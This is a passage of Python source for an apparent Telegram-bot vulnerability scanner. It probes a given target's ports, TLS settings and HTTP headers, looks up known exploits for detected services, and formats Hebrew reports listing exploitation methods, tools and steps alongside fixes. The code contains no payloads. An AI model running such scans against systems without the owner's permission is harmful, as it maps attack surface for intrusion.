                return banner.decode().strip()
            elif service == 'ftp' and port == 21:
                # Try to get FTP banner
                loop = asyncio.get_event_loop()
                future = asyncio.open_connection(host, port)
                reader, writer = await asyncio.wait_for(future, timeout=5.0)
                banner = await asyncio.wait_for(reader.readline(), timeout=3.0)
                writer.close()
                await writer.wait_closed()
                return banner.decode().strip()
        except:
            pass
        
        return f"{service} service detected"

    async def scan_vulnerabilities(self, target: str) -> Dict[str, Any]:
        """Main vulnerability scanning function"""
        results = {
            'target': target,
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'security_score': 0,
            'recommendations': [],
            'details': {},
            'known_exploits': []
        }
        
        try:
            # Resolve target to IP
            target_ip = await self._resolve_target(target)
            results['target_ip'] = target_ip
            
            # Run vulnerability checks
            ssl_results = await self._check_ssl_vulnerabilities(target)
            headers_results = await self._check_http_headers(target)
            ports_results = await self._analyze_open_ports(target_ip)
            service_results = await self._check_service_versions(target_ip)
            
            # Search for known exploits based on detected services
            if service_results and 'details' in service_results:
                for service_info in service_results['details'].get('services', []):
                    service_name = service_info.get('service', '')
                    version = service_info.get('version', '')
                    if service_name:
                        exploits = await self.search_known_exploits(service_name, version)
                        results['known_exploits'].extend(exploits)
            
            # Compile results
            all_results = [ssl_results, headers_results, ports_results, service_results]
            
            for check_result in all_results:
                if check_result and 'vulnerabilities' in check_result:
                    results['vulnerabilities'].extend(check_result['vulnerabilities'])
                if check_result and 'details' in check_result:
                    results['details'].update(check_result['details'])
            
            # Calculate security score
            results['security_score'] = self._calculate_security_score(results)
            
            # Generate recommendations
            results['recommendations'] = self._generate_recommendations(results)
            
        except Exception as e:
            results['error'] = f"Scan failed: {str(e)}"
            
        return results
    
    async def _resolve_target(self, target: str) -> str:
        """Resolve domain to IP address"""
        try:
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, socket.gethostbyname, target)
            return result
        except:
            # If it's already an IP, return as-is
            return target
    
    async def _check_ssl_vulnerabilities(self, target: str) -> Dict[str, Any]:
        """Check SSL/TLS vulnerabilities"""
        results = {
            'vulnerabilities': [],
            'details': {'ssl_info': {}}
        }
        
        try:
            # Check if HTTPS is available
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(f'https://{target}', timeout=10) as response:
                        # SSL is available, check for vulnerabilities
                        ssl_info = await self._get_ssl_info(target)
                        results['details']['ssl_info'] = ssl_info
                        
                        # Check for weak SSL versions
                        if ssl_info.get('protocol_version', '').startswith('TLS'):
                            version = ssl_info.get('protocol_version', '')
                            if 'TLSv1.0' in version or 'TLSv1.1' in version:
                                vuln_info = self.vuln_database['ssl_version']
                                results['vulnerabilities'].append({
                                    'type': vuln_info['title'],
                                    'severity': 'Medium',
                                    'description': f'{vuln_info["description"]} - {version}',
                                    'exploitation': vuln_info['exploitation'],
                                    'prevention': vuln_info['prevention']
                                })
                        
                        # Check certificate expiry
                        if ssl_info.get('expires_in_days', 365) < 30:
                            vuln_info = self.vuln_database['certificate_expiry']
                            results['vulnerabilities'].append({
                                'type': vuln_info['title'],
                                'severity': 'High',
                                'description': f'{vuln_info["description"]} - {ssl_info.get("expires_in_days")} ימים',
                                'exploitation': vuln_info['exploitation'],
                                'prevention': vuln_info['prevention']
                            })
                            
                except:
                    # HTTPS not available
                    results['vulnerabilities'].append({
                        'type': 'No HTTPS',
                        'severity': 'Medium', 
                        'description': 'No HTTPS encryption available',
                        'recommendation': 'Implement HTTPS with valid SSL certificate'
                    })
                    
        except Exception as e:
            results['details']['ssl_error'] = str(e)
            
        return results
    
    async def _get_ssl_info(self, target: str) -> Dict[str, Any]:
        """Get detailed SSL certificate information"""
        ssl_info = {}
        try:
            context = ssl.create_default_context()
            with socket.create_connection((target, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    ssl_info['subject'] = dict(x[0] for x in cert['subject'])
                    ssl_info['issuer'] = dict(x[0] for x in cert['issuer'])
                    ssl_info['version'] = cert['version']
                    ssl_info['serial_number'] = cert['serialNumber']
                    ssl_info['not_before'] = cert['notBefore']
                    ssl_info['not_after'] = cert['notAfter']
                    ssl_info['protocol_version'] = ssock.version()
                    
                    # Calculate days until expiry
                    from datetime import datetime
                    expiry_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_left = (expiry_date - datetime.now()).days
                    ssl_info['expires_in_days'] = days_left
                    
        except Exception as e:
            ssl_info['error'] = str(e)
            
        return ssl_info
    
    async def _check_http_headers(self, target: str) -> Dict[str, Any]:
        """Check HTTP security headers"""
        results = {
            'vulnerabilities': [],
            'details': {'headers': {}}
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                for protocol in ['https', 'http']:
                    try:
                        async with session.get(f'{protocol}://{target}', timeout=10) as response:
                            headers = dict(response.headers)
                            results['details']['headers'][protocol] = headers
                            
                            # Check for missing security headers
                            security_headers = {
                                'Strict-Transport-Security': 'missing_hsts',
                                'Content-Security-Policy': 'missing_csp'
                            }
                            
                            for header, vuln_key in security_headers.items():
                                if header not in headers:
                                    if header == 'Strict-Transport-Security' and protocol == 'http':
                                        continue  # HSTS only applies to HTTPS
                                    vuln_info = self.vuln_database[vuln_key]
                                    results['vulnerabilities'].append({
                                        'type': vuln_info['title'],
                                        'severity': 'Medium',
                                        'description': vuln_info['description'],
                                        'exploitation': vuln_info['exploitation'],
                                        'prevention': vuln_info['prevention']
                                    })
                            
                            # Check Server header disclosure
                            if 'Server' in headers:
                                vuln_info = self.vuln_database['server_info']
                                results['vulnerabilities'].append({
                                    'type': vuln_info['title'],
                                    'severity': 'Low',
                                    'description': f'{vuln_info["description"]} - {headers["Server"]}',
                                    'exploitation': vuln_info['exploitation'],
                                    'prevention': vuln_info['prevention']
                                })
                                
                            break  # Use first successful connection
                    except:
                        continue
                        
        except Exception as e:
            results['details']['headers_error'] = str(e)
            
        return results
    
    async def _analyze_open_ports(self, target_ip: str) -> Dict[str, Any]:
        """Analyze open ports for vulnerabilities"""
        results = {
            'vulnerabilities': [],
            'details': {'open_ports': []}
        }
        
        try:
            # Quick port scan of common ports
            open_ports = []
            for port, service in self.common_ports.items():
                if await self._is_port_open(target_ip, port):
                    open_ports.append({'port': port, 'service': service})
                    
                    # Check for risky services
                    if port == 21:  # FTP
                        vuln_info = self.vuln_database['insecure_ftp']
                        results['vulnerabilities'].append({
                            'type': vuln_info['title'],
                            'severity': 'High',
                            'description': vuln_info['description'],
                            'exploitation': vuln_info['exploitation'],
                            'prevention': vuln_info['prevention']
                        })
                    elif port == 23:  # Telnet
                        vuln_info = self.vuln_database['insecure_telnet']
                        results['vulnerabilities'].append({
                            'type': vuln_info['title'],
                            'severity': 'High',
                            'description': vuln_info['description'],
                            'exploitation': vuln_info['exploitation'],
                            'prevention': vuln_info['prevention']
                        })
                    elif port == 22:  # SSH
                        # Could add SSH version/config checks here
                        pass
                        
            results['details']['open_ports'] = open_ports
            
            # Check for too many open ports
            if len(open_ports) > 5:
                results['vulnerabilities'].append({
                    'type': 'Excessive Open Ports',
                    'severity': 'Medium',
                    'description': f'{len(open_ports)} ports are open, increasing attack surface',
                    'recommendation': 'Close unnecessary ports and services'
                })
                
        except Exception as e:
            results['details']['ports_error'] = str(e)
            
        return results
    
    async def _is_port_open(self, host: str, port: int, timeout: float = 3) -> bool:
        """Check if a port is open"""
        try:
            future = asyncio.open_connection(host, port)
            reader, writer = await asyncio.wait_for(future, timeout=timeout)
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False
    
    async def _check_service_versions(self, target_ip: str) -> Dict[str, Any]:
        """Check service versions for known vulnerabilities"""
        results = {
            'vulnerabilities': [],
            'details': {'services': {}}
        }
        
        # This would typically involve service fingerprinting
        # For now, we'll do basic banner grabbing
        
        return results
    
    def _calculate_security_score(self, results: Dict[str, Any]) -> int:
        """Calculate overall security score (0-100)"""
        score = 100
        
        for vuln in results['vulnerabilities']:
            severity = vuln.get('severity', 'Low')
            if severity == 'Critical':
                score -= 25
            elif severity == 'High':
                score -= 15
            elif severity == 'Medium':
                score -= 10
            elif severity == 'Low':
                score -= 5
                
        return max(0, score)
    
    def _generate_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Extract unique recommendations from vulnerabilities
        for vuln in results['vulnerabilities']:
            rec = vuln.get('recommendation', '')
            if rec and rec not in recommendations:
                recommendations.append(rec)
                
        # Add general recommendations
        if results['security_score'] < 70:
            recommendations.append('Consider hiring a security professional for comprehensive audit')
            
        return recommendations

def format_detailed_vulnerability_info(vuln: Dict[str, Any]) -> str:
    """Format detailed vulnerability information with exploitation methods"""
    info = f"🔐 **{vuln['type']}**\n\n"
    
    # Description
    info += f"📋 **תיאור הפגיעות:**\n{vuln['description']}\n\n"
    
    # Exploitation details
    if 'exploitation' in vuln:
        exp = vuln['exploitation']
        info += f"⚔️ **איך מנצלים את הפגיעות:**\n"
        info += f"• **שיטה:** {exp['method']}\n"
        
        if 'tools' in exp:
            tools_str = ', '.join(exp['tools'])
            info += f"• **כלים:** {tools_str}\n"
        
        if 'steps' in exp:
            info += f"• **צעדי ניצול:**\n"
            for step in exp['steps'][:3]:  # Limit to 3 steps
                info += f"  {step}\n"
            if len(exp['steps']) > 3:
                info += f"  ...ועוד {len(exp['steps'])-3} צעדים\n"
        
        if 'impact' in exp:
            info += f"• **השפעה:** {exp['impact']}\n"
        info += "\n"
    
    # Prevention details
    if 'prevention' in vuln:
        prev = vuln['prevention']
        info += f"🛡️ **איך למנוע ולתקן:**\n"
        
        if 'immediate' in prev:
            info += f"• **תיקון מיידי:**\n"
            for action in prev['immediate'][:2]:  # Limit to 2 actions
                info += f"  - {action}\n"
        
        if 'configuration' in prev:
            info += f"• **הגדרה:** `{prev['configuration'][:80]}...`\n"
        
        if 'testing' in prev:
            info += f"• **בדיקה:** `{prev['testing'][:60]}...`\n"
    
    return info

def format_vulnerability_report(scan_result: Dict[str, Any]) -> str:
    """Format vulnerability scan results for Telegram"""
    if 'error' in scan_result:
        return f"❌ **שגיאה בסריקת פגיעויות**\n\n{scan_result['error']}"
    
    target = scan_result.get('target', 'Unknown')
    score = scan_result.get('security_score', 0)
    vulns = scan_result.get('vulnerabilities', [])
    known_exploits = scan_result.get('known_exploits', [])
    
    # Determine score emoji
    if score >= 90:
        score_emoji = "🟢"
    elif score >= 70:
        score_emoji = "🟡" 
    elif score >= 50:
        score_emoji = "🟠"
    else:
        score_emoji = "🔴"
    
    report = f"🔐 **דוח סריקת פגיעויות**\n\n"
    report += f"🎯 **יעד:** `{target}`\n"
    report += f"{score_emoji} **ציון אבטחה:** {score}/100\n\n"
    
    # Show known exploits first (most critical)
    if known_exploits:
        critical_exploits = [e for e in known_exploits if e.get('severity', '').lower() == 'critical']
        high_exploits = [e for e in known_exploits if e.get('severity', '').lower() == 'high']
        
        if critical_exploits or high_exploits:
            report += f"💥 **⚠️ EXPLOITS ידועים נמצאו! ({len(known_exploits)}) ⚠️**\n\n"
            
            # Show critical exploits
            for exploit in critical_exploits[:2]:
                report += f"🔴 **CRITICAL: {exploit.get('title', 'Unknown')}**\n"
                if 'cve' in exploit:
                    report += f"🏷️ CVE: `{exploit['cve']}`\n"
                report += f"📝 {exploit.get('description', '')}\n"
                if 'exploitation' in exploit and 'impact' in exploit['exploitation']:
                    report += f"💥 השפעה: {exploit['exploitation']['impact']}\n"
                report += "\n"
            
            # Show high severity exploits
            for exploit in high_exploits[:1]:
                report += f"🟠 **HIGH: {exploit.get('title', 'Unknown')}**\n"
                if 'cve' in exploit:
                    report += f"🏷️ CVE: `{exploit['cve']}`\n"
                report += f"📝 {exploit.get('description', '')}\n\n"
                
            if len(known_exploits) > 3:
                report += f"⚠️ ועוד {len(known_exploits)-3} exploits נוספים!\n\n"
        else:
            report += f"📋 **מידע על exploits:** נמצאו {len(known_exploits)} exploits\n\n"
    
    # Show other vulnerabilities
    if not vulns and not known_exploits:
        report += "✅ **לא נמצאו פגיעויות ידועות!**\n\n"
        report += "המערכת נראית מאובטחת בבדיקה בסיסית."
    elif vulns:
        # Group by severity
        critical = [v for v in vulns if v.get('severity') == 'Critical']
        high = [v for v in vulns if v.get('severity') == 'High'] 
        medium = [v for v in vulns if v.get('severity') == 'Medium']
        low = [v for v in vulns if v.get('severity') == 'Low']
        
        report += f"📊 **פגיעויות נוספות:**\n"
        
        if critical:
            report += f"🚨 **קריטיות ({len(critical)}):**\n"
            for vuln in critical[:2]:  # Show max 2
                report += f"• {vuln['type']}: {vuln['description']}\n"
            if len(critical) > 2:
                report += f"• ועוד {len(critical)-2} פגיעויות קריטיות...\n"
            report += "\n"
            
        if high:
            report += f"🔴 **גבוהות ({len(high)}):**\n"
            for vuln in high[:2]:
                report += f"• {vuln['type']}: {vuln['description']}\n"
            if len(high) > 2:
                report += f"• ועוד {len(high)-2} פגיעויות גבוהות...\n"
            report += "\n"
            
        if medium:
            report += f"🟡 **בינוניות ({len(medium)}):**\n"
            for vuln in medium[:1]:
                report += f"• {vuln['type']}\n"
            if len(medium) > 1:
                report += f"• ועוד {len(medium)-1} פגיעויות בינוניות...\n"
            report += "\n"
            
        if low:
            report += f"🔵 **נמוכות:** {len(low)} פגיעויות נוספות\n\n"
    
    # Add top recommendations
    recommendations = scan_result.get('recommendations', [])
    if recommendations:
        report += "💡 **המלצות עיקריות:**\n"
        for rec in recommendations[:3]:
            report += f"• {rec}\n"
        if len(recommendations) > 3:
            report += f"• ועוד {len(recommendations)-3} המלצות...\n"
    
    # Add scan info
    scan_time = scan_result.get('scan_time', 'Unknown')
    report += f"\n📅 **זמן סריקה:** {scan_time[:19].replace('T', ' ')}"
    
    return report